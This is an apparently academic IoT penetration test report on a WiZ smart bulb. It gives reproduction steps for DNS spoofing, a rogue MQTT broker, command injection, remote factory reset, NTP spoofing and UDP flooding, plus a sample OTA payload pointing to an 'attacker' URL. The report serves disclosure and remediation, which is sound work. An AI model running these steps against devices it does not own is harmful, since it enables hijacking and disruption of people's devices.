# Signify WiZ Connected Smart Bulb — IoT Security Assessment

> IoT Security Assessment / Smart Lighting Penetration Test

**Report ID:** R-2026-001  
**Issue Date:** 24/04/2026  
**Version:** 1.0  
**Author(s):** Mae Pearse McConigly 
**Programme:** NHL Stenden University of Applied Sciences / RUN-EU Cybersecurity  

---

## Confidentiality Notice

This document contains sensitive security information regarding vulnerabilities identified in Signify WiZ Connected smart lighting products. Distribution is restricted to the intended recipient(s) and authorised reviewers. This report must not be shared, published, or disclosed publicly without prior written consent from the author and, if applicable, coordination with Signify's vulnerability disclosure programme (disclosure@signify.com). Unauthorised disclosure may compromise device security for end users.

---

# 1. Revision History

| Name | Date | Version | Comment |
|---|---|---|---|
| Mae Pearse McConigly | 22/04/2026 | 0.1 | Initial protocol mapping, DNS spoofing (Claude session) |
| Mae Pearse McConigly| 23/04/2026 | 0.2 | MQTT MITM, command injection, transparent proxy (Claude session) |
| Mae Pearse McConigly | 23/04/2026 | 0.3 | NTP spoofing, DoS, optical channel, OTA analysis (Gemini session) |
| Mae Pearse McConigly | 24/04/2026 | 1.0 | Final consolidated report |

---

# 2. Introduction

## 2.1 Client Context

**Summary of the assessed environment:**  
Signify WiZ Connected RGBCW A19 smart bulb — a consumer IoT lighting device sold globally under the Philips WiZ brand. The device connects to home Wi-Fi and is controlled via a mobile application, voice assistants (Alexa, Google Home), and Signify's cloud infrastructure. Uses an ESP-based microcontroller with MQTT over TLS for cloud communication and a local UDP JSON-RPC API for low-latency control.

**Business importance:**  
WiZ is Signify's consumer smart lighting platform, deployed in millions of homes and increasingly in commercial settings (hotels, offices, retail). Security vulnerabilities affect end-user privacy, physical safety (lighting control in commercial buildings), and Signify's brand reputation.

## 2.2 Assessment Objective

The objective was to identify exploitable vulnerabilities in the WiZ bulb's network communication stack, evaluate the security of its cloud integration, and assess physical side-channel risks. Conducted as independent security research for an academic cybersecurity programme (GCFIAB capstone) with the intention of responsible disclosure.

## 2.3 Scope and Duration

**Assessment period:** 22 April 2026 to 24 April 2026  
**Total effort:** Approximately 18 hours across two sessions  
**Testing model:** Grey Box (device owned by researcher, no source code, no vendor documentation beyond public API)  
**Perspective:** Internal network (LAN-adjacent attacker)

**Work phases performed:**
- Phase 1 — Local protocol mapping and UDP API enumeration
- Phase 2 — DNS spoofing infrastructure and MQTT interception
- Phase 3 — Cloud impersonation, command injection, transparent proxy
- Phase 4 — NTP temporal attack, denial of service, optical side-channel
- Phase 5 — OTA mechanism analysis and factory reset testing
- Phase 6 — Evidence consolidation and reporting

## 2.4 Included Scenarios

- Local network API security (UDP JSON-RPC)
- Cloud communication security (MQTT over TLS)
- DNS dependency and manipulation
- Time synchronisation security (NTP)
- Firmware update mechanism
- Physical side-channel (optical covert channel)
- Denial of service resilience

## 2.5 In-Scope Assets

**Assets authorised for testing:**
- WiZ Connected RGBCW A19 bulb, MAC 98:77:D5:C0:23:82, firmware 1.37.0
- Researcher's private network (Windows IoT LTSC Mobile Hotspot, 192.168.137.0/24)
- DNS resolution for *.wiz.world and *.wiz.connected.lighting (spoofed locally)
- MQTT broker at eu.mqtt.wiz.world:8883 (relayed via transparent proxy)

## 2.6 Out-of-Scope Assets

**Out of scope:**
- Signify's production cloud infrastructure (no direct testing)
- Other users' WiZ devices
- WiZ mobile application binary (no reverse engineering)
- Bluetooth/BLE provisioning protocol
- Matter protocol stack
- Physical hardware disassembly (no UART/JTAG)

**Prohibited activities:**
- Persistent modification of Signify's cloud infrastructure
- Testing on devices/networks not owned by the researcher
- Public disclosure prior to coordinated disclosure with Signify

## 2.7 Constraints and Assumptions

**Known constraints:**
- Windows IoT LTSC Mobile Hotspot introduced ICS port 53 conflicts and VirtualBox NAT limitations
- Single bulb available (no fleet-scale testing)
- No vendor documentation or source code access
- Bulb IP rotated on DHCP lease expiry, requiring MAC-based tracking

**Assumptions:**
- Findings are representative of WiZ firmware 1.37.0 across all models using the same branch
- MQTT protocol behaviour observed is consistent with Signify's production cloud
- Absence of certificate validation is a firmware-level decision, not a test environment artifact

---

# 3. Executive Summary

## 3.1 Overall Result Overview

The assessment identified **11 findings**: **2 High**, **7 Medium**, and **2 Low** severity. No Critical findings were identified, as all attacks require LAN adjacency (CVSS Attack Vector: Adjacent).

Overall, the device demonstrates a reasonable local security posture (privilege separation between UDP and MQTT channels, secure boot) but a fundamentally broken cloud security model due to the absence of server certificate validation. This single flaw enables a cascade of attacks compromising confidentiality, integrity, and availability.

## 3.2 Key Risks

1. **Missing Certificate Validation (VULN-01) — High (CVSS 7.4)**  
   The bulb accepts any TLS certificate for its cloud connection. An attacker on the same network can impersonate Signify's cloud, capture all telemetry, and send arbitrary commands.

2. **Cloud Command Injection (VULN-02) — High (CVSS 7.1)**  
   Once the cloud connection is intercepted, commands execute without additional verification. The attacker has the same control as Signify's infrastructure.

3. **Persistent Denial of Service (VULN-05 + VULN-06) — Medium (compounded)**  
   Combining NTP spoofing with UDP flooding creates a crash loop persisting until the attacker stops and the bulb is physically power-cycled.

## 3.3 Positive Observations

- Privilege separation between local UDP and cloud MQTT channels: destructive operations (factory reset) correctly restricted on local API
- TLS 1.2 with strong cipher suite (ECDHE-RSA-AES256-GCM-SHA384)
- Secure boot prevents execution of unsigned firmware
- Hybrid architecture maintains local control when cloud is unavailable
- Local API correctly rejects malformed JSON with standard JSON-RPC error codes

## 3.4 Next Steps

- **High (immediate):** VULN-01 (certificate pinning), VULN-02 (message signing)
- **Medium (30-90 days):** VULN-03 (local API auth), VULN-05 (NTP auth), VULN-06 (rate limiting), VULN-09 (reset challenge), VULN-11 (DNS hardening)
- **Low (backlog):** VULN-07 (optical mitigation), VULN-08 (OTA URL validation)

## 3.5 Caveats

This report reflects a time-limited assessment of a single device on a private network. Absence of evidence of additional vulnerabilities should not be interpreted as proof that none exist. A real attacker is not constrained by time, scope, or ethical considerations. Continuous assessment and retesting is recommended.

## 3.6 Risk Categories

| Category | Description |
|---|---|
| Critical | Severe risk, trivial exploitation, significant business impact |
| High | Important risk with strong potential for compromise |
| Medium | Meaningful risk with moderate impact or conditional exploitation |
| Low | Limited risk, difficult to exploit, or low direct impact |
| Informational | Observation or hardening opportunity |

## 3.7 CVSS Equivalency

| Category | CVSS v3.1 Range |
|---|---|
| Critical | 9.0 – 10.0 |
| High | 7.0 – 8.9 |
| Medium | 4.0 – 6.9 |
| Low | 0.1 – 3.9 |
| Informational | N/A |

> **Note:** Not all findings map cleanly to CVSS. Architectural and side-channel issues require contextual assessment.

---

# 4. Methodology

## 4.1 Testing Approach

Manual techniques supported by custom Python tooling. No automated vulnerability scanners used. All findings confirmed through direct observation of device behaviour.

## 4.2 Assessment Phases

1. Reconnaissance and local protocol enumeration (UDP API mapping)
2. Network infrastructure setup (DNS spoofing, certificate generation)
3. Cloud communication interception (MQTT MITM)
4. Command injection and cloud impersonation validation
5. Transparent bidirectional proxy for cloud protocol analysis
6. Temporal attacks (NTP spoofing) and denial of service
7. Physical side-channel (optical covert channel)
8. OTA mechanism and factory reset analysis
9. Evidence consolidation and reporting

## 4.3 Techniques Used

- UDP protocol reverse engineering via packet crafting
- DNS spoofing via authoritative response injection (DNSChef)
- TLS MITM with self-signed certificates
- MQTT pub/sub manipulation
- NTP response spoofing
- UDP flooding for resource exhaustion
- Optical signal modulation (B-FSK) and computer vision decoding
- Transparent TLS proxy with bidirectional traffic logging
- Kernel-level packet capture (Windows pktmon)

## 4.4 References / Frameworks

- OWASP IoT Top 10 (2018)
- MITRE CWE (Common Weakness Enumeration)
- CVSS v3.1
- MQTT v3.1.1 OASIS Standard
- RFC 8915 (Network Time Security)
- pywizlight community documentation

## 4.5 Methodological Limitations

- Single device tested (no fleet-scale validation)
- No source code or vendor documentation available
- Windows IoT LTSC environment introduced infrastructure friction
- Optical decoder achieved partial recovery due to camera VFR
- OTA trigger mechanism not directly observed (server-initiated via MQTT)

---

# 5. Attack Surface Mapping

## 5.1 Attack Surface Overview

The WiZ bulb exposes four attack surfaces: local UDP API (port 38899, unauthenticated JSON-RPC), cloud MQTT (port 8883, TLS without cert validation), NTP (port 123, unauthenticated), and physical LED output (optical side-channel). DNS resolution is the gateway to all three network surfaces.

## 5.2 Architecture

```
[WiZ Bulb ESP]──WiFi──┬──UDP:38899──[WiZ App / LAN devices]
                       ├──MQTT/TLS:8883──[eu.mqtt.wiz.world]──[Signify Cloud]
                       ├──NTP:123──[ntp.wiz.world]
                       └──HTTP:80──[Firmware CDN] (OTA)

[WiZ Phone App]──HTTPS──[Signify Cloud]──MQTT──[Bulb]
                         (remote control path)
```

## 5.3 Identified Attack Vectors

| Vector | Surface | Possible Impact | Findings |
|---|---|---|---|
| DNS spoofing | All cloud services | Full cloud redirect | VULN-01,05,08,11 |
| Self-signed TLS cert | MQTT broker | Cloud impersonation | VULN-01 |
| MQTT topic injection | OP/pro/\<id\>/devices/\<mac\> | Device control | VULN-02 |
| UDP JSON-RPC | Port 38899 | Local device control | VULN-03 |
| NTP response spoofing | Port 123 | Clock manipulation | VULN-05 |
| UDP packet flood | Port 38899 | Denial of service | VULN-06 |
| LED on/off modulation | Physical light output | Data exfiltration | VULN-07 |
| OTA URL injection | MQTT + HTTP | SSRF / DDoS amplification | VULN-08 |

---

# 6. Recommended Actions (Consolidated View)

| ID | Title | Action | Risk | CVSS | Owner | Timeline |
|---|---|---|---|---|---|---|
| VULN-01 | Missing cert validation | Pin server certificate | High | 7.4 | Firmware | Immediate |
| VULN-02 | MQTT command injection | HMAC message signing | High | 7.1 | Firmware | Immediate |
| VULN-09 | Remote factory reset | Challenge-response for reset | Medium | 6.5 | Firmware | 30 days |
| VULN-03 | Unauthenticated UDP API | Session authentication | Medium | 6.3 | Firmware | 30 days |
| VULN-04 | Telemetry disclosure | Minimise syncInit fields | Medium | 5.7 | Cloud | 60 days |
| VULN-05 | NTP spoofing DoS | NTS or plausibility checks | Medium | 5.3 | Firmware | 60 days |
| VULN-06 | UDP flood DoS | Rate limiting | Medium | 5.3 | Firmware | 60 days |
| VULN-10 | Bidirectional MITM | Mutual TLS | Medium | 5.3 | Cloud | 90 days |
| VULN-08 | OTA SSRF | Allowlist firmware URLs | Medium | 4.3 | Cloud | 90 days |
| VULN-11 | DNS dependency | DoT/DoH + fallback IPs | Medium | 4.3 | Firmware | 90 days |
| VULN-07 | Optical side-channel | Rate-limit state toggling | Low | 3.0 | Firmware | Backlog |

---

# 7. Technical Findings

Findings ordered by severity (highest first).

---

## 7.1. Missing MQTT Server Certificate Validation

### 7.1.1 Finding Summary
The bulb connects to Signify's MQTT cloud broker (eu.mqtt.wiz.world:8883) over TLS 1.2 but performs no server certificate validation. A self-signed certificate was accepted without error, enabling full MITM interception.

### 7.1.2 Risk Classification

| Metric | Value |
|---|---|
| Finding ID | VULN-01 |
| Risk Category | **High** |
| CWE | CWE-295 (Improper Certificate Validation) |
| CVSS v3.1 | **7.4** |
| CVSS Vector | CVSS:3.1/AV:A/AC:L/PR:N/UI:N/S:C/C:H/I:N/A:N |

**Rationale:** Adjacent network access required (AV:A). No authentication or user interaction needed. Changed scope (S:C) because compromising the MQTT session enables attacks on the cloud control plane beyond the device itself. High confidentiality impact due to telemetry and credential capture.

### 7.1.3 Background
CWE-295 occurs when an application fails to verify the identity of a TLS peer. In IoT, the device cannot prompt users to accept untrusted certificates — it must autonomously validate server identity via certificate pinning or strict CA chain validation. Without this, DNS manipulation enables cloud impersonation.

### 7.1.4 Evidence / Technical Details

**Affected item(s):** eu.mqtt.wiz.world:8883 (MQTT over TLS)

**Preconditions:** LAN-level DNS control (e.g. rogue DHCP, ARP spoofing, compromised router, or hosting the network gateway)

**Steps to reproduce:**
1. Configure DNSChef: `python dnschef.py --fakeip 192.168.137.1 --fakedomains eu.mqtt.wiz.world --nameservers 1.1.1.1#53`
2. Generate self-signed certificate: `openssl req -x509 -newkey rsa:2048 -nodes -keyout key.pem -out cert.pem -days 30 -subj "/CN=eu.mqtt.wiz.world"`
3. Start Mosquitto with TLS on port 8883 using the self-signed cert
4. Power-cycle the bulb to force fresh DNS lookup and MQTT reconnection
5. Observe Mosquitto log for successful client connection

**Observed response / evidence:**
```
New client connected from 192.168.137.167:50985 as 9877d5c02382_20540294 (p3, c1, k40, u'9877d5c02382').
Client 9877d5c02382_20540294 negotiated TLSv1.2 cipher ECDHE-RSA-AES256-GCM-SHA384
Sending CONNACK to 9877d5c02382_20540294 (0, 0)
Received SUBSCRIBE from 9877d5c02382_20540294
    OP/pro/20540294/devices/9877d5c02382 (QoS 0)
Received PUBLISH from 9877d5c02382_20540294 (d0, q0, r0, m0, 'DEV/pro/9877d5c02382', ... (202 bytes))
```

### 7.1.5 Impact Analysis
Complete cloud impersonation. Attacker captures all telemetry (firmware version, home ID, LAN IP, SSID hash, boot diagnostics), observes all state changes, and can inject arbitrary commands. Every WiZ device on the compromised network is affected. This finding is the gateway to VULN-02, VULN-04, VULN-09, and VULN-10.

### 7.1.6 Exploitability / Likelihood Analysis
Low complexity. Requires LAN presence and ability to respond to DNS queries (achievable via ARP spoofing, rogue DHCP, or hosting the gateway). No user interaction. No authentication needed. Fully automated once infrastructure is in place.

### 7.1.7 Recommendation
**Primary:** Pin Signify's server certificate public key hash in firmware. Reject connections where the presented certificate does not match the pinned hash.

**Additional:** Bundle a dedicated root CA and validate exclusively against it. Implement mutual TLS (mTLS) with device client certificates provisioned during manufacturing. Monitor certificate transparency logs for *.wiz.world.

**Suggested priority:** Immediate

### 7.1.8 References
1. CWE-295: https://cwe.mitre.org/data/definitions/295.html
2. OWASP IoT Top 10 2018: I3 - Insecure Ecosystem Interfaces
3. NIST SP 800-183: Networks of Things

### 7.1.9 Retest Notes
- Attempt connection with self-signed cert; verify TLS alert (unknown_ca or handshake_failure)
- Verify bulb rejects certs not signed by Signify's expected CA

---

## 7.2. Cloud Command Injection via MQTT OP Topic

### 7.2.1 Finding Summary
Commands published to the OP/pro/\<homeId\>/devices/\<mac\> MQTT topic are executed without message signing, integrity verification, or secondary authentication beyond the TLS session.

### 7.2.2 Risk Classification

| Metric | Value |
|---|---|
| Finding ID | VULN-02 |
| Risk Category | **High** |
| CWE | CWE-345 (Insufficient Verification of Data Authenticity) |
| CVSS v3.1 | **7.1** |
| CVSS Vector | CVSS:3.1/AV:A/AC:L/PR:N/UI:N/S:C/C:N/I:H/A:N |

### 7.2.3 Background
CWE-345 occurs when a system accepts data without verifying its origin. In MQTT pub/sub, any connected client can publish to any topic. If the broker is compromised (VULN-01), the device cannot distinguish legitimate from injected commands.

### 7.2.4 Evidence / Technical Details

**Affected item(s):** MQTT topic OP/pro/20540294/devices/9877d5c02382

**Preconditions:** Successful MQTT MITM (VULN-01)

**Steps to reproduce:**
1. Establish rogue MQTT broker per VULN-01
2. Create payload file cmd.json: `{"method":"setPilot","params":{"state":true,"r":255,"g":0,"b":0,"dimming":100}}`
3. Publish: `mosquitto_pub -h 127.0.0.1 -p 8883 --cafile cert.pem --insecure -t "OP/pro/20540294/devices/9877d5c02382" -f cmd.json`
4. Observe bulb change to solid red at full brightness

**Observed response / evidence:**
```
mosquitto_sub output:
DEV/pro/9877d5c02382 {"method":"syncPilot","env":"pro","params":{"mac":"9877d5c02382","rssi":-75,
"devices":1,"src":"wizappd","state":true,"sceneId":0,"r":255,"g":0,"b":0,"c":0,"w":0,"dimming":100}}

Prior malformed JSON returned: {"error":{"code":-32700,"message":"Parse error"}}
```

### 7.2.5 Impact Analysis
Full control of bulb state (on/off, colour, brightness, scene, pulse). In commercial deployments, enables coordinated lighting disruption.

### 7.2.6 Exploitability / Likelihood Analysis
Trivial once VULN-01 is exploited. Single MQTT message. No rate limiting observed.

### 7.2.7 Recommendation
**Primary:** Sign cloud-to-device MQTT messages with per-device HMAC key derived during provisioning.

**Additional:** Implement message sequence numbers for replay prevention. Add per-command nonces for destructive operations.

**Suggested priority:** Immediate

### 7.2.8 References
1. CWE-345: https://cwe.mitre.org/data/definitions/345.html
2. MQTT v3.1.1 OASIS Standard, Section 3.3 (PUBLISH)

### 7.2.9 Retest Notes
- Inject unsigned setPilot; verify rejection
- Verify HMAC validation failure produces logged error

---

## 7.3. Remote Factory Reset via MQTT Injection

### 7.3.1 Finding Summary
Factory reset injected via the compromised MQTT channel de-provisioned the bulb. The same command via local UDP was rejected, confirming privilege separation bypassed by cloud MITM.

### 7.3.2 Risk Classification

| Metric | Value |
|---|---|
| Finding ID | VULN-09 |
| Risk Category | **Medium** |
| CWE | CWE-284 (Improper Access Control) |
| CVSS v3.1 | **6.5** |
| CVSS Vector | CVSS:3.1/AV:A/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:H |

### 7.3.3 Background
The system correctly restricts destructive operations on one channel (UDP) but fails to authenticate the source on the cloud channel once TLS is compromised. Sound design undermined by VULN-01.

### 7.3.4 Evidence / Technical Details

**Steps to reproduce:**
1. Attempt UDP reset: `echo -n '{"method":"reset","params":{}}' | nc -u -w1 <bulb_ip> 38899` — accepted but NOT executed (privilege separation confirmed)
2. Inject reset via MQTT OP topic through proxy
3. Observe bulb enter pairing mode (pulsing pattern)
4. WiZ app reports device offline

**Evidence:** UDP reset returned success:true but bulb remained operational. MQTT-injected reset triggered visible pairing mode. Recovery required re-pairing.

### 7.3.5 Impact Analysis
Remote de-provisioning. Combined with persistent DNS spoofing, re-pairing can be intercepted for persistent DoS.

### 7.3.6 Exploitability / Likelihood Analysis
Single MQTT message once VULN-01 is established.

### 7.3.7 Recommendation
**Primary:** Require cryptographic challenge-response for destructive operations, incorporating device-side nonce.

**Additional:** Require physical confirmation (button press within 30s) for remote factory reset.

**Suggested priority:** High (30 days)

### 7.3.8 References
1. CWE-284: https://cwe.mitre.org/data/definitions/284.html

### 7.3.9 Retest Notes
- Inject MQTT reset and verify challenge-response required
- Verify UDP reset remains restricted

---

## 7.4. Unauthenticated Local Control API

### 7.4.1 Finding Summary
JSON-RPC on UDP 38899 with no authentication, encryption, or rate limiting. 15+ methods including device control, configuration, Wi-Fi credential changes, and Wi-Fi reconnaissance.

### 7.4.2 Risk Classification

| Metric | Value |
|---|---|
| Finding ID | VULN-03 |
| Risk Category | **Medium** |
| CWE | CWE-306 (Missing Authentication for Critical Function) |
| CVSS v3.1 | **6.3** |
| CVSS Vector | CVSS:3.1/AV:A/AC:L/PR:N/UI:N/S:U/C:L/I:H/A:N |

### 7.4.3 Background
Designed for low-latency mobile app control, but complete absence of authentication means any LAN device can exercise full control.

### 7.4.4 Evidence / Technical Details

**Methods confirmed:** getPilot, setPilot, getSystemConfig, getModelConfig, getUserConfig, setUserConfig, registration, firstBeat, getWifiConfig, reboot, reset (rejected — privilege separation), pulse, setWifi, getSchd, setSchd, getFavs.

All tested via netcat and Python socket.sendto(). All returned valid JSON responses.

### 7.4.5 Impact Analysis
Complete local control. Wi-Fi credential change can isolate the device. getWifiConfig exposes neighbouring SSIDs. setUserConfig writes to flash.

### 7.4.6 Exploitability / Likelihood Analysis
Trivial. Single UDP datagram. No tooling beyond netcat.

### 7.4.7 Recommendation
**Primary:** Per-session challenge-response authentication using a shared secret from cloud provisioning.

**Suggested priority:** High (30 days)

### 7.4.8 References
1. CWE-306: https://cwe.mitre.org/data/definitions/306.html
2. OWASP IoT Top 10: I1 - Weak/Guessable/Hardcoded Passwords

### 7.4.9 Retest Notes
- Attempt unauthenticated setPilot; verify rejection

---

## 7.5. Sensitive Telemetry and Credential Disclosure

### 7.5.1 Finding Summary
MQTT CONNECT transmits credentials; syncInit exposes firmware version, home ID, LAN IP, SSID hash, boot diagnostics. Cloud responses leak internal service naming (orig: wizappd).

### 7.5.2 Risk Classification

| Metric | Value |
|---|---|
| Finding ID | VULN-04 |
| Risk Category | **Medium** |
| CWE | CWE-200 |
| CVSS v3.1 | **5.7** |
| CVSS Vector | CVSS:3.1/AV:A/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N |

### 7.5.3 Evidence / Technical Details

**Captured syncInit:**
```json
{"fwVersion":"1.37.0","homeId":20540294,"ip":"192.168.137.13",
"hssid":"2d14a88288","bootRsn":"pwon","cnx":"0009000A","reboots":0}
```

**CONNECT raw bytes decoded:** Client ID: 9877d5c02382_20540294, username: 9877d5c02382, password: 16-char token.

**Cloud response:** orig field = "wizappd" (internal service name).

### 7.5.4 Impact Analysis
Firmware version enables targeted exploits. Home ID enables cross-device correlation. Password token may enable direct cloud API access.

### 7.5.5 Recommendation
Minimise telemetry fields. Rotate credentials per connection. Remove internal service naming from payloads.

**Suggested priority:** Medium (60 days)

---

## 7.6. Temporal Denial of Service via NTP Spoofing

### 7.6.1 Finding Summary
Spoofing NTP responses to return 1999 caused the bulb to reject legitimate TLS certificates, creating a persistent reconnection loop disabling all cloud functionality.

### 7.6.2 Risk Classification

| Metric | Value |
|---|---|
| Finding ID | VULN-05 |
| Risk Category | **Medium** |
| CWE | CWE-346 |
| CVSS v3.1 | **5.3** |
| CVSS Vector | CVSS:3.1/AV:A/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H |

### 7.6.3 Evidence / Technical Details

**Steps:** Run DNSChef spoofing ntp.wiz.world. Run NTP server returning April 22 1999 (Stratum 4). Power-cycle bulb.

**Evidence:** NTP server logged 6 consecutive requests from bulb, each served 1999 timestamp. WiZ app reported offline. Local UDP control remained functional (hybrid architecture).

### 7.6.4 Impact Analysis
Cloud functionality disabled: voice assistants, remote access, schedules, OTA. Persists until spoof removed and bulb power-cycled.

### 7.6.5 Recommendation
Implement NTS (RFC 8915) or plausibility checks (reject >1 year jumps). Multiple NTP sources with median filtering.

**Suggested priority:** Medium (60 days)

---

## 7.7. Resource Exhaustion via UDP Flooding

### 7.7.1 Finding Summary
Flooding UDP 38899 with getSystemConfig at max throughput caused progressive degradation, unresponsiveness, and hardware watchdog reset. Combined with NTP spoofing, created persistent crash loop.

### 7.7.2 Risk Classification

| Metric | Value |
|---|---|
| Finding ID | VULN-06 |
| Risk Category | **Medium** |
| CWE | CWE-400 |
| CVSS v3.1 | **5.3** |
| CVSS Vector | CVSS:3.1/AV:A/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H |

### 7.7.3 Evidence / Technical Details

**Script:** `while True: sock.sendto(payload, (BULB_IP, PORT))`

**Observed:** Bulb froze (no response to any commands), turned off after ~30-60s (WDT reset). With NTP spoof active, entered crash loop. Recovery required physical power cycle with scripts stopped.

### 7.7.4 Recommendation
Token bucket rate limiter: 5 commands/second per source IP. Prioritise MQTT keepalive over UDP.

**Suggested priority:** Medium (60 days)

---

## 7.8. Bidirectional Cloud Traffic Interception

### 7.8.1 Finding Summary
Custom transparent MQTT proxy provided full bidirectional visibility into all traffic, including cloud-originated commands (setPilot with orig:wizappd), capability hashes, and session management.

### 7.8.2 Risk Classification

| Metric | Value |
|---|---|
| Finding ID | VULN-10 |
| Risk Category | **Medium** |
| CWE | CWE-319 |
| CVSS v3.1 | **5.3** |
| CVSS Vector | CVSS:3.1/AV:A/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N |

### 7.8.3 Evidence / Technical Details

**Captured cloud-originated command:**
```json
{"method":"setPilot","params":{"state":false,"orig":"wizappd"}}
```

**Cloud syncInit response:**
```json
{"method":"syncInit","result":{"snr":0,"favs":1,"luxSensing":0,"sec":1,
"model":1748191022,"accs":"1b7852b855","matter":"3b7e58d558"}}
```

**src values observed:** ios2, wizappd, intl, recover. PINGREQ/PINGRESP every 40s confirmed stable session.

### 7.8.4 Recommendation
Certificate pinning (VULN-01 fix) prevents this entirely. Additionally implement mTLS and end-to-end MQTT payload encryption.

**Suggested priority:** Medium (90 days)

---

## 7.9. Server-Side Request Forgery via OTA Mechanism

### 7.9.1 Finding Summary
Firmware update mechanism accepts arbitrary URLs and performs HTTP GET requests, turning the bulb into an HTTP request proxy. Firmware binaries fetched over unencrypted HTTP.

### 7.9.2 Risk Classification

| Metric | Value |
|---|---|
| Finding ID | VULN-08 |
| Risk Category | **Medium** |
| CWE | CWE-918 |
| CVSS v3.1 | **4.3** |
| CVSS Vector | CVSS:3.1/AV:A/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:L |

### 7.9.3 Evidence / Technical Details

**Captured firmware URL pattern:** `GET /firmwares/ESP24_SHRGBW_01/<version>/wizlight.bin` over HTTP.

**PoC payload:** `{"method":"updateOta","params":{"fw":"9.99.9","url":"http://attacker/payload","s1":"0000...","s2":"0000..."}}` injected via MQTT proxy.

**Note:** No firmware-specific DNS domains observed during testing (updates are server-initiated via MQTT, infrequent). Signify's secure boot prevents unsigned firmware execution.

### 7.9.4 Recommendation
Allowlist firmware URLs to Signify domains. Migrate HTTP to HTTPS with cert validation.

**Suggested priority:** Medium (90 days)

---

## 7.10. DNS-Dependent Infrastructure with No Fallback

### 7.10.1 Finding Summary
All cloud endpoints resolved via unauthenticated DNS with no DNSSEC, DoH/DoT, or hardcoded fallback IPs. DNS is the single gateway to MQTT, NTP, and OTA.

### 7.10.2 Risk Classification

| Metric | Value |
|---|---|
| Finding ID | VULN-11 |
| Risk Category | **Medium** |
| CWE | CWE-350 |
| CVSS v3.1 | **4.3** |
| CVSS Vector | CVSS:3.1/AV:A/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H |

### 7.10.3 Evidence / Technical Details

**DNSChef log:** "cooking the response of type 'A' for eu.mqtt.wiz.world to 192.168.137.1", "cooking the response of type 'A' for ntp.wiz.world to 192.168.137.1". Fresh queries on every power cycle. No fallback observed.

### 7.10.4 Recommendation
Implement DoT/DoH. Maintain hardcoded fallback IP list. DNSSEC validation where available.

**Suggested priority:** Medium (90 days)

---

## 7.11. Covert Optical Side-Channel via LED Modulation

### 7.11.1 Finding Summary
Unauthenticated UDP API enables on/off modulation to encode binary data as visible light pulses (B-FSK), creating a covert exfiltration channel readable by any camera within line of sight.

### 7.11.2 Risk Classification

| Metric | Value |
|---|---|
| Finding ID | VULN-07 |
| Risk Category | **Low** |
| CWE | CWE-514 |
| CVSS v3.1 | **3.0** |
| CVSS Vector | CVSS:3.1/AV:A/AC:H/PR:L/UI:R/S:C/C:L/I:N/A:N |

### 7.11.3 Evidence / Technical Details

**Transmitter:** Python script encoding ASCII as binary, toggling setPilot state:true/false at 1.5s intervals with 101010 calibration preamble. Transmitted "PW123" (40 bits).

**Decoder:** OpenCV pixel thresholding (240+), morphological filtering, clock recovery from preamble. Extracted 42-bit stream from 30 FPS MP4. Partial ASCII recovery ("HD" instead of "PW" due to ~1 bit sampling phase offset consistent with camera VFR drift).

**Firmware constraint:** PWM fade curve requires bit intervals >1s for steady-state, limiting effective bitrate to 0.66 bps.

### 7.11.4 Impact Analysis
Air-gap data exfiltration. Low bitrate practical for short secrets (passwords, PINs, tokens). No network egress required.

### 7.11.5 Recommendation
Rate-limit setPilot to max 1 change per second. Apply random delays to state transitions.

**Suggested priority:** Backlog

---

# 8. Additional Information

## 8.1 DNS Domains Observed

| Domain | Type | Purpose |
|---|---|---|
| eu.mqtt.wiz.world | A | Primary MQTT cloud broker |
| ntp.wiz.world | A | Signify NTP server |
| a.wiz.connected.lighting | A | Secondary/legacy endpoint |

## 8.2 TLS Assessment

- Supported protocol: TLS 1.2
- Negotiated cipher: ECDHE-RSA-AES256-GCM-SHA384 (strong)
- Server certificate CN: mqtt.wiz.world
- Certificate validation: **ABSENT** (self-signed accepted)
- Client certificate: not required

## 8.3 MQTT Protocol Parameters

| Parameter | Value |
|---|---|
| Protocol | MQTT 3.1.1 (MQIsdp) |
| Client ID | \<mac\>_\<homeId\> |
| Username | \<mac\> |
| Password | 16-char token |
| Keep-alive | 40 seconds |
| Clean session | Yes |
| Will topic | DEV/pro/\<mac\> |
| Will payload | {"method":"status","params":{"connected":false}} |

## 8.4 Assessment Timeline

| Date/Time | Activity |
|---|---|
| 22 Apr, 19:00-21:00 | UDP API mapping, heartbeat listener, network debugging |
| 23 Apr, 19:00-20:30 | DNS spoofing, rogue MQTT broker, cert validation testing |
| 23 Apr, 20:30-21:00 | Command injection, transparent MITM proxy |
| 23 Apr, 21:00-23:00 | NTP spoofing, UDP flood DoS, factory reset testing |
| 23 Apr, 23:00-01:00 | Optical transmitter/decoder, OTA analysis |
| 24 Apr, 09:00-10:00 | Evidence consolidation, report drafting |

---

# 9. Appendices

## 9.1 Tools Used

| Tool | Purpose |
|---|---|
| DNSChef (iphelix) | DNS spoofing |
| Mosquitto 2.1.2 | Rogue MQTT broker |
| mitmqtt.py (custom) | Transparent MQTT MITM proxy |
| heartbeat.py (custom) | UDP push listener |
| ntp_spoof.py (custom) | Rogue NTP server |
| exfiltrate.py (custom) | Optical B-FSK transmitter |
| exfiltrate-decode.py (custom) | OpenCV optical decoder |
| flood.py (custom) | UDP flood DoS |
| OpenSSL | TLS certificate generation |
| pktmon (Windows) | Packet capture |
| Python 3.14 | Scripting |

## 9.2 Scoring References

- CVSS v3.1: https://www.first.org/cvss/v3.1/specification-document
- CWE: https://cwe.mitre.org
- OWASP IoT Top 10: https://owasp.org/www-project-internet-of-things-top-10/

---

# Annex A: Remediation Plan

| ID | Finding | Action | Owner | Priority | Due | Status |
|---|---|---|---|---|---|---|
| 01 | Cert validation | Pin server certificate | Firmware | Immediate | May 2026 | Open |
| 02 | Command injection | HMAC signing | Firmware | Immediate | May 2026 | Open |
| 09 | Remote reset | Challenge-response | Firmware | High | Jun 2026 | Open |
| 03 | UDP auth | Session auth | Firmware | High | Jun 2026 | Open |
| 04 | Telemetry | Minimise fields | Cloud | Medium | Jul 2026 | Open |
| 05 | NTP spoof | NTS/plausibility | Firmware | Medium | Jul 2026 | Open |
| 06 | UDP flood | Rate limiting | Firmware | Medium | Jul 2026 | Open |
| 10 | MITM | mTLS | Cloud | Medium | Aug 2026 | Open |
| 08 | OTA SSRF | URL allowlist | Cloud | Medium | Aug 2026 | Open |
